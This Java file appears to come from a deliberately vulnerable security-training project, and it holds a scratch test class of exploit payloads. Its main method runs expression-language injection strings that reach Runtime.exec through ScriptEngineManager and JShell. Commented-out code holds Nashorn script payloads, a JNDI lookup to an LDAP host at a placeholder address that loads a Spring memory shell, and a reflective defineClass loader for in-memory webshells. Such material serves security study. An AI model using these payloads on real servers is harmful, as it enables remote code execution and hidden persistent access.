package org.joychou.controller;

//import com.feihong.ldap.template.SpringMemshellTemplate;
//import com.unboundid.util.Base64;
//import org.joychou.util.ClassUtil;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.el.ELProcessor;
import javax.naming.NamingException;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

@RestController
@RequestMapping("/test")
public class Test {

    @RequestMapping(value = "/")
    public String Index(HttpServletResponse response, String empId) {

        System.out.println(empId);
        Cookie cookie = new Cookie("XSRF-TOKEN", "123");
        cookie.setDomain("taobao.com");
        cookie.setMaxAge(-1); // forever time
        response.addCookie(cookie);
        return "success";
    }


    @RequestMapping(value = "/aa")
    public void test(HttpServletResponse response, String empId) {

        System.out.println(empId);
        Cookie cookie = new Cookie("XSRF-TOKEN", "123");
        cookie.setDomain("taobao.com");
        cookie.setMaxAge(-1); // forever time
        response.addCookie(cookie);
    }

    public static void main(String[] args) throws NamingException {

//            javax.script.ScriptEngineManager scriptEngineManager = (ScriptEngineManager) "".getClass().forName("javax.script.ScriptEngineManager").newInstance();
//            String scriptPayload2= "s=[3];s[0]='cmd';s[1]='/c';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);";
//            scriptEngineManager.getEngineByName("nashorn").eval(scriptPayload2);
//            String test="var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec('calc')};";
//            ScriptEngineManager manager = new ScriptEngineManager(null);
//            ScriptEngine engine = manager.getEngineByName("js");
//            engine.eval(test);

        ELProcessor elProcessor = new ELProcessor();
        String elPayload = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\"calc\");')";
        String elPayload2= "''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('java.lang.Runtime.getRuntime().exec(\"calc\")')";
        elProcessor.eval(elPayload2);
        //        String clientInfo = "rdp-sys:1";
//        String secret = Base64.encode(clientInfo.getBytes(StandardCharsets.UTF_8));
//        String header = String.format("%s %s", "X-ZJMZXFZHL-INNER-APP ", secret);
//        System.out.println(header);

//        new org.springframework.jndi.JndiLocatorDelegate().lookup("ldap://a.b.c.d:1389/TomcatBypass/SpringMemshell");
    }

//    public static void testMemShell(){
//        Class clazz = SpringMemshellTemplate.class;
//        String classCode = null;
//        try {
//            classCode = ClassUtil.getClassCode(clazz);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        ;
//        byte[] bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(classCode);
//        ClassLoader classLoader = java.lang.Thread.currentThread().getContextClassLoader();
//        try{
//            clazz = classLoader.loadClass(clazz.getName());
//            clazz.newInstance();
//        }catch(Exception e) {
//            try {
//                Method method = ClassLoader.class.getDeclaredMethod("defineClass", "".getBytes().getClass(), Integer.TYPE, Integer.TYPE);
//                method.setAccessible(true);
//                Class clazz2 = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
//                clazz2.newInstance();
//            } catch (NoSuchMethodException ex) {
//                ex.printStackTrace();
//            } catch (InvocationTargetException invocationTargetException) {
//                invocationTargetException.printStackTrace();
//            } catch (IllegalAccessException illegalAccessException) {
//                illegalAccessException.printStackTrace();
//            } catch (InstantiationException instantiationException) {
//                instantiationException.printStackTrace();
//            }
//
//            e.printStackTrace();
//        }
//    }
}
